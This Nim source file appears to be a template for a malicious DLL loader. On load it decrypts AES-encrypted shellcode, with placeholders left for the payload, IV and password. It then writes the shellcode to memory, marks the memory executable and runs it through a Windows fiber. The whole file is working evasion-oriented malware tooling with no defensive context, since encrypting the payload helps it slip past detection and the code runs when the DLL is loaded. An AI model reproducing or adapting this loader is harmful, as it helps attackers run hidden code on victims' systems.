import winim/lean
import nimcrypto

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

let encShellcode = "REPLACE_ME"
let iv = "BLANK_IV"
let passwd = """BLANK_PASSWORD"""

var dctx: CTR[aes256]

let shellcode = fromHex(encShellcode)
var decShellcode = newSeq[byte](len(shellcode))
let decodedIV = fromHex(iv)

var expandedkey = sha256.digest(passwd)
dctx.init(expandedkey.data, decodedIV)
dctx.decrypt(shellcode, decShellcode)
dctx.clear()

proc NimMain() {.cdecl, importc.}

proc execute(): void =
    var oldProtect: DWORD
    ConvertThreadToFiber(NULL)
    let buffer = VirtualAlloc(NULL, cast[SIZE_T](decShellcode.len), MEM_COMMIT, PAGE_READ_WRITE)
    var bytesWritten: SIZE_T
    let pHandle = GetCurrentProcess()
    WriteProcessMemory(pHandle, buffer, unsafeAddr decShellcode[0], cast[SIZE_T](decShellcode.len), addr bytesWritten)
    VirtualProtect(buffer, cast[SIZE_T](decShellcode.len), PAGE_EXECUTE, addr oldProtect)
    let xFiber = CreateFiber(0, cast[LPFIBER_START_ROUTINE](buffer), NULL)
    SwitchToFiber(xFiber)

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  
  if fdwReason == DLL_PROCESS_ATTACH:
    execute()

  return true
